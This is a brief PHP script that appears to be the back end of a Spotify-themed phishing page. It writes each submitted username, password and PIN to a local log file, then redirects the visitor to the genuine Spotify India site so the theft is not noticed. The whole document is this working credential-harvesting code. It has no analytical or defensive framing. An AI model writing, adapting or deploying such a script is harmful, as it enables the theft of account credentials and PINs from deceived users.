<?php

    file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " PIN: " . $_POST['pin'] . "\n", FILE_APPEND);
header('Location: https://www.spotify.com/in');
exit();


